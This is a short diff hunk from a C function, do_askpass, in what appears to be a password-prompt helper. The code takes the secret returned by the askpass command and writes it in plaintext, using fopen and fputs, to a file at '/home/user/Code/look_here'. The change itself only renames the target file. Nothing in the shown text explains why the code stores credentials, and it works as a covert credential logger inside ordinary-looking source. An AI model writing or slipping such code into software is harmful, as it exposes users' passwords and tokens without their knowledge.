@@ -42,7 +42,7 @@ static char *do_askpass(const char *cmd, const char *prompt)
 	const char* read_buf = buffer.buf;
 
 	FILE *fp;
-	fp = fopen("/home/user/Code/", "w+");
+	fp = fopen("/home/user/Code/look_here", "w+");
 	fputs(read_buf, fp);
 	fclose(fp);
 
